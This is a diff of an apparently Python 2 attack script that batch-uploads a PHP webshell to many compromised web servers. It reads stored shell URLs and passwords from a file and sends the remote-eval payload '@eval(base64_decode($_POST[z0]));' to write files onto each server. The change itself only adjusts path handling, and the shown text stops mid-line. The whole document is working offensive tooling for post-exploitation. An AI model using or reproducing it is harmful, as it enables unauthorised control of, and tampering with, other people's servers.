@@ -27,10 +27,13 @@ def get_shell_path(posturl,passwd):
     return shell_path
 
 
-def upload(localpath='shell.php'):
+def upload(localpath='auxi/shell.php'):
     print '\n+++++++++Batch Uploading Local File (Only for PHP webshell)++++++++++\n'
-    shellfile = 'webshell.txt'  # 存放webshell路径和密码的文件
+    shellfile = 'auxi/webshell.txt'  # 存放webshell路径和密码的文件
     localfile = localpath  # 本地待上传的文件名
+    flag=localfile.split('/')
+    x=len(flag)
+    filepath=flag[x-1]
     shell_file = open(shellfile,'rb')
     local_content = str(open(localfile,'rb').read())
     for eachline in shell_file:
@@ -42,9 +45,9 @@ def upload(localpath='shell.php'):
             if match_shell_name:
                 shell_name = match_shell_name.group(1)
                 shell_path = get_shell_path(posturl,passwd).strip()
-                target_path = shell_path.split(shell_name)[0] + localfile
+                target_path = shell_path.split(shell_name)[0] + filepath
                 target_path_base64 = base64.b64encode(target_path)
-                target_file_url = eachline.split(shell_name)[0] + localfile
+                target_file_url = eachline.split(shell_name)[0] + filepath
                 data = {}
                 data[passwd] = '@eval(base64_decode($_POST[z0]));'
                 data[
